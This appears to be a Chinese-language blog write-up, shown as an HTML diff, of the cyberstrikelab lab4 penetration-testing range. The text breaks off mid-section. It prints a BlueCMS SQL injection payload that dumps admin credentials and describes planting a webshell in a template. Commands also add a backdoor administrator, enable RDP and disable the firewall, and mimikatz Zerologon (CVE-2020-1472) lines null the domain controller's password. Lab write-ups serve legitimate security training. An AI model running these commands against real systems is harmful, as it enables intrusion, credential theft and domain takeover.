@@ -1,0 +1,1062 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" lab4 精简思路\n1 这靶场越加简单，10拿shell后直接上传猕猴桃，添加一个用户rpd登入后打域控提权置空域控机器密码，然后拿域控hash，最后才搭个代理，pth拿20，30主机flag。这题看别的师傅，发现30主机有永恒之蓝，给30主机添加用户后上线cs，然后拿hash打20主机。 cyberstrikelab—lab1-7—WP-先知社区\nLab4\nbluecms1.6 sql注入 + 后台getshell-flag1 扫一下扫到一个主机，但是直接不能访问\n">
+<title>cyber-lab4</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/cyber-lab4/'>
+
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="cyber-lab4">
+<meta property='og:description' content=" lab4 精简思路\n1 这靶场越加简单，10拿shell后直接上传猕猴桃，添加一个用户rpd登入后打域控提权置空域控机器密码，然后拿域控hash，最后才搭个代理，pth拿20，30主机flag。这题看别的师傅，发现30主机有永恒之蓝，给30主机添加用户后上线cs，然后拿hash打20主机。 cyberstrikelab—lab1-7—WP-先知社区\nLab4\nbluecms1.6 sql注入 + 后台getshell-flag1 扫一下扫到一个主机，但是直接不能访问\n">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/cyber-lab4/'>
+<meta property='og:site_name' content='zhizuijimi'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2026-01-13T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-01-13T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="cyber-lab4">
+<meta name="twitter:description" content=" lab4 精简思路\n1 这靶场越加简单，10拿shell后直接上传猕猴桃，添加一个用户rpd登入后打域控提权置空域控机器密码，然后拿域控hash，最后才搭个代理，pth拿20，30主机flag。这题看别的师傅，发现30主机有永恒之蓝，给30主机添加用户后上线cs，然后拿hash打20主机。 cyberstrikelab—lab1-7—WP-先知社区\nLab4\nbluecms1.6 sql注入 + 后台getshell-flag1 扫一下扫到一个主机，但是直接不能访问\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#bluecms16-sql注入--后台getshell-flag1">bluecms1.6 sql注入 + 后台getshell-flag1</a></li>
+    <li><a href="#cve-2020-1472域控提权-flag02--flag03">CVE-2020-1472域控提权-flag02 &amp; flag03</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F/" style="background-color: #00ff00; color: #fff;">
+                渗透
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/cyber-lab4/">cyber-lab4</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-01-13</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<h1 id="lab4">lab4
+</h1><p>精简思路</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">这靶场越加简单，10拿shell后直接上传猕猴桃，添加一个用户rpd登入后打域控提权置空域控机器密码，然后拿域控hash，最后才搭个代理，pth拿20，30主机flag。这题看别的师傅，发现30主机有永恒之蓝，给30主机添加用户后上线cs，然后拿hash打20主机。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://xz.aliyun.com/news/16810"  target="_blank" rel="noopener"
+    >cyberstrikelab—lab1-7—WP-先知社区</a></p>
+<p><a class="link" href="https://www.yuque.com/yuqueyonghu20ymon/ct8qga/cef95rydtiaup8h9"  target="_blank" rel="noopener"
+    >Lab4</a></p>
+<h2 id="bluecms16-sql注入--后台getshell-flag1">bluecms1.6 sql注入 + 后台getshell-flag1
+</h2><p>扫一下扫到一个主机，但是直接不能访问</p>
+<p><img src="/p/cyber-lab4/image-20260113163302533.png"
+	width="681"
+	height="149"
+	srcset="/p/cyber-lab4/image-20260113163302533_hu_cc7325d8f6d194be.png 480w, /p/cyber-lab4/image-20260113163302533_hu_a215c59d87053cac.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113163302533"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="457"
+		data-flex-basis="1096px"
+	
+></p>
+<p>扫全端口，可以扫到一个5820端口,bluecms的站点</p>
+<p><img src="/p/cyber-lab4/image-20260113160924373.png"
+	width="1578"
+	height="708"
+	srcset="/p/cyber-lab4/image-20260113160924373_hu_5d3fe94ba68915f4.png 480w, /p/cyber-lab4/image-20260113160924373_hu_f44fc2c3d4d5f89a.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113160924373"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="222"
+		data-flex-basis="534px"
+	
+></p>
+<p><a class="link" href="https://www.cnblogs.com/fengzun/articles/17932952.html"  target="_blank" rel="noopener"
+    >bluecms v1.6 SQL注入 - Fengzun - 博客园</a>,这个cms的ad_js.php存在sql注入的漏洞</p>
+<p><img src="/p/cyber-lab4/image-20260113161600843.png"
+	width="1057"
+	height="197"
+	srcset="/p/cyber-lab4/image-20260113161600843_hu_50a48949338fd4a2.png 480w, /p/cyber-lab4/image-20260113161600843_hu_513c5b128a71f8e5.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113161600843"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="536"
+		data-flex-basis="1287px"
+	
+></p>
+<p>获取管理员用户名和密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ad_js.php?ad_id=1 UNION SELECT 1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab4/image-20260113161629632.png"
+	width="1346"
+	height="150"
+	srcset="/p/cyber-lab4/image-20260113161629632_hu_32bf3996505bb48f.png 480w, /p/cyber-lab4/image-20260113161629632_hu_5dd3e6a969fffe2a.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113161629632"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="897"
+		data-flex-basis="2153px"
+	
+></p>
+<p>解码得<strong>admin123456</strong>，访问 <code>/admin</code>自动跳转进行登录，然后编辑模板，可以写马进行拿shell，但是保存路径呢？</p>
+<p><img src="/p/cyber-lab4/image-20260113165317042.png"
+	width="1210"
+	height="406"
+	srcset="/p/cyber-lab4/image-20260113165317042_hu_c112699ba332a9ed.png 480w, /p/cyber-lab4/image-20260113165317042_hu_6cd1e598fc4c5ada.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113165317042"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="298"
+		data-flex-basis="715px"
+	
+></p>
+<p>可以写个错误的文件名，看报错名就知道路径了</p>
+<p><img src="/p/cyber-lab4/image-20260113165307867.png"
+	width="1266"
+	height="418"
+	srcset="/p/cyber-lab4/image-20260113165307867_hu_7a3533f62c2fd7.png 480w, /p/cyber-lab4/image-20260113165307867_hu_9c6c664772274a08.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113165307867"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="726px"
+	
+></p>
+<p>所以路径就是<code>templates/default/index.php</code></p>
+<p><img src="/p/cyber-lab4/image-20260113165326027.png"
+	width="1398"
+	height="439"
+	srcset="/p/cyber-lab4/image-20260113165326027_hu_e9f4ac6889b9443d.png 480w, /p/cyber-lab4/image-20260113165326027_hu_e5ace3c3e8e38c76.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113165326027"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="318"
+		data-flex-basis="764px"
+	
+></p>
+<p>连马拿flag1</p>
+<p><img src="/p/cyber-lab4/image-20260113165751398.png"
+	width="441"
+	height="131"
+	srcset="/p/cyber-lab4/image-20260113165751398_hu_c9237ce4e68cd230.png 480w, /p/cyber-lab4/image-20260113165751398_hu_a87d045698dfaedb.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113165751398"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="336"
+		data-flex-basis="807px"
+	
+></p>
+<p>当然还有其它getshell方法，如下，不过差不多</p>
+<p><a class="link" href="https://blog.csdn.net/weixin_72007549/article/details/127540398"  target="_blank" rel="noopener"
+    >Bluecms后台任意修改文件getshell_bluecms 靶场获取getshell-CSDN博客</a></p>
+<h2 id="cve-2020-1472域控提权-flag02--flag03">CVE-2020-1472域控提权-flag02 &amp; flag03
+</h2><p>发现有内网，上传fscan扫</p>
+<p><img src="/p/cyber-lab4/image-20260113170633501.png"
+	width="725"
+	height="344"
+	srcset="/p/cyber-lab4/image-20260113170633501_hu_ed2e6b12a34e897c.png 480w, /p/cyber-lab4/image-20260113170633501_hu_874bd0fa162fda83.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113170633501"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="210"
+		data-flex-basis="505px"
+	
+></p>
+<p>发现3台主机，没其它信息</p>
+<p><img src="/p/cyber-lab4/image-20260113171107353.png"
+	width="816"
+	height="90"
+	srcset="/p/cyber-lab4/image-20260113171107353_hu_5b378ea4d8240781.png 480w, /p/cyber-lab4/image-20260113171107353_hu_2134e5ef94ffc739.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113171107353"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="906"
+		data-flex-basis="2176px"
+	
+></p>
+<p>发现dns server服务在30主机，说明30主机是域控服务器，拿就是和lab3一样利用域控提权打域控了</p>
+<p><img src="/p/cyber-lab4/image-20260113170926950.png"
+	width="848"
+	height="686"
+	srcset="/p/cyber-lab4/image-20260113170926950_hu_778bdc81ae423b08.png 480w, /p/cyber-lab4/image-20260113170926950_hu_a2b93c190894c2ee.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113170926950"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="123"
+		data-flex-basis="296px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">所以最简单的思路就是用kali打了，先上线cs，然后上传猕猴桃后直接用lab3的域控提权，直接哈希传递就行了
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>kali连vpn</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo openvpn --config cyberstrikelab.com-lab4.ovpn --keepalive 10 60 --route-nopull --route 192.168.10.0 255.255.255.0 &amp;
+</span></span><span class="line"><span class="cl">#这样忽略服务端推送的所有路由配置”。这样它就不会改你的默认网关了。然后手动把需要的那个内网段补回
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上线cs</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./teamserver 172.16.233.2 111111
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab4/image-20260113190924630.png"
+	width="452"
+	height="332"
+	srcset="/p/cyber-lab4/image-20260113190924630_hu_a4dcdda26f3b44fd.png 480w, /p/cyber-lab4/image-20260113190924630_hu_1b0dd099ba536522.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113190924630"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="326px"
+	
+></p>
+<p>蚁剑上传，哦对，要添加用户</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+</span></span><span class="line"><span class="cl">net user hack Admin@123 /add
+</span></span><span class="line"><span class="cl">net localgroup Administrators hack /add
+</span></span><span class="line"><span class="cl">netsh firewall set opmode disable
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>代理都不用，直接rpd</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xfreerdp /u:hack /p:&#39;Admin@123&#39; /v:192.168.10.10 /cert:ignore /tls-seclevel:0 /drive:share,/mnt/xpw/kali_shard
+</span></span><span class="line"><span class="cl">#/tls-seclevel:0 参数，降低安全验证等级，允许连接旧系统。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后上线cs</p>
+<p><img src="/p/cyber-lab4/image-20260113191322492.png"
+	width="1137"
+	height="456"
+	srcset="/p/cyber-lab4/image-20260113191322492_hu_fa59fb788728786d.png 480w, /p/cyber-lab4/image-20260113191322492_hu_4c4c607a9c585a54.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113191322492"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="598px"
+	
+></p>
+<p>然后上传猕猴桃直接打CVE-2020-1472域控提权，不过要知道30主机的主机名，ping一下就知道了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ping -a 192.168.20.30
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab4/image-20260113192141886.png"
+	width="558"
+	height="139"
+	srcset="/p/cyber-lab4/image-20260113192141886_hu_7f7d4054a3c66ec1.png 480w, /p/cyber-lab4/image-20260113192141886_hu_9b76601c8e074706.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113192141886"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="401"
+		data-flex-basis="963px"
+	
+></p>
+<p>打下面这个命令，发现确实存在这个cve-输出了<code>NetrServerAuthenticate2: 0x00000000</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell mimikatz.exe &#34;lsadump::zerologon /target:192.168.20.30 /account:WIN-7NRTJO59O7N$ &#34;exit&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab4/image-20260113192532176.png"
+	width="829"
+	height="486"
+	srcset="/p/cyber-lab4/image-20260113192532176_hu_bfcb3c8e98a0617f.png 480w, /p/cyber-lab4/image-20260113192532176_hu_6b8cae1c2b8f640a.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113192532176"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="170"
+		data-flex-basis="409px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell mimikatz.exe &#34;lsadump::zerologon /target:192.168.20.30 /ntlm /null /account:WIN-7NRTJO59O7N$ /exploit&#34; &#34;exit&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab4/image-20260113192933901.png"
+	width="973"
+	height="387"
+	srcset="/p/cyber-lab4/image-20260113192933901_hu_fbe10c6337104a40.png 480w, /p/cyber-lab4/image-20260113192933901_hu_f234c19740c2c8f3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260113192933901"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="603px"
+	
+></p>
+<p>置空成功，去拿hash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
